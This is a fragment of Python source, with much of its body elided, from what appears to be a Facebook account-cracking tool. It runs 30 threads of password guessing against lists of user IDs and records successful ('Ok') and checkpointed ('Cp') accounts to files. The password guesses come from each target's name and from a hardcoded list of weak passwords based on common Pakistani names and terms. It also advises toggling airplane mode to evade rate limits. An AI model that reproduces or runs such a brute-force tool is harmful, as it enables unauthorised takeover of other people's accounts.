...
class crack:
	...
	def fbeh(self,id):
		...
		if kham in ['']:
				...
				if pw in ['']:
					...
					def manual(xnxx=None):
						...
						if mani in ['']:
							...
							print(' %s '%(N))
							print('  [%s*%s] Ok account will be saved in file : Ok.txt'%(O,N))
							print('  [%s*%s] Cp account will be saved in file : Cp.txt\n'%(O,N))
			...
			print(' %s [%s1%s] Metode Free'%(N,O,N))
			print(' %s [%s2%s] Metode Mbasic'%(N,O,N))
			print(' %s [%s3%s] Metode Mobile/RECOMMEND'%(N,O,N))
			self.otomatis()
	def otomatis(self):
		print(' %s '%(N))
	...
	def free(self):
		print(' %s '%(N))
		print(' %s [%s*%s] Ok account will be saved in file  : hasil/okeh.txt'%(N,O,N))
		print(' %s [%s*%s] Cp account will be saved in file : hasil/cepeh.txt\n'%(N,O,N))
		with khamdihiXD(max_workers=30) as dihi:
			for me in self.id:
				try:
					uid, name = me.split('<=>')
	...
	def basic(self):
		...
		print(' %s [%s!%s] Airplane mode 2 seconds if no result\n'%(N,O,N))
		with khamdihiXD(max_workers=30) as dihi:
			for me in self.id:
				try:
					uid, name = me.split('<=>')
		...
		with khamdihiXD(max_workers=30) as dihi:
			for nama in self.id:
				try:
					...
					nun = gas[0]
					if len(nun)>=6:
						pwx = ['123456','khan','Ali','Allah','Muhammad','khan123','786786','000786','Pathan','Pakistan','Khan12','112233','Rajpoot','Jutt','Main','Gujjar']
					elif len(nun)<=1:
						pwx = [nun, nun+'12', nun+'123', nun+'1234', nun+'12345', name]
					elif len(nun)<=2:
						pwx = [nun, nun+'12', nun+'123', nun+'1234', nun+'12345', name]
